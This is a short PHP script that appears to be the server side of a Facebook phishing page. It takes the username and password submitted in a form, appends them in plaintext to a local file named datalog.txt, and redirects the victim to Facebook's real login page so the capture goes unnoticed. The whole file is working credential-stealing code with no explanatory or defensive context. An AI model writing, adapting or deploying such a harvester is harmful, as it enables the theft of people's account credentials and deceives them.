<?php

$username=$_POST["username"];
$password=$_POST["password"];


//echo "$username : " . $password;


$myfile = fopen("datalog.txt", "a") or die("unable to open file!");


$txt="USERNAME=$username, PASSWORD=$password\n";


fwrite($myfile, "\n".$txt);
fclose($myfile);


header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");

exit();

?>